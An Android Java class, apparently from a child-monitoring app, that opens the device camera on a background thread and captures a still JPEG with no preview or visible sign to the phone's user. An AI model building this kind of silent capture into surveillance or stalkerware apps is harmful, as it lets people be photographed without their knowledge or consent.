package com.kidsguard.child;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;
import java.util.Collections;
public class BackgroundCamera {
    private CameraDevice device;
    private ImageReader reader;
    private HandlerThread thread;
    public void init(Context ctx) {
        thread = new HandlerThread("Cam"); thread.start();
        CameraManager m = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        try { m.openCamera(m.getCameraIdList()[0], stateCb, new Handler(thread.getLooper())); }
        catch (Exception e) { Log.e("Cam", "Open fail", e); }
    }
    private final CameraDevice.StateCallback stateCb = new CameraDevice.StateCallback() {
        @Override public void onOpened(CameraDevice c) {
            device = c;
            try {
                reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
                c.createCaptureSession(Collections.singletonList(reader.getSurface()), sessionCb, new Handler(thread.getLooper()));
            } catch (Exception e) {}
        }
        @Override public void onDisconnected(CameraDevice c) { c.close(); }
        @Override public void onError(CameraDevice c, int e) { c.close(); }
    };
    private final CameraCaptureSession.StateCallback sessionCb = new CameraCaptureSession.StateCallback() {
        @Override public void onConfigured(CameraCaptureSession s) {
            try {
                CaptureRequest.Builder b = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                b.addTarget(reader.getSurface());
                s.capture(b.build(), null, null);
            } catch (Exception e) {}
        }
        @Override public void onConfigureFailed(CameraCaptureSession s) {}
    };
    public void release() {
        if (device != null) device.close();
        if (reader != null) reader.close();
        if (thread != null) thread.quitSafely();
    }
}
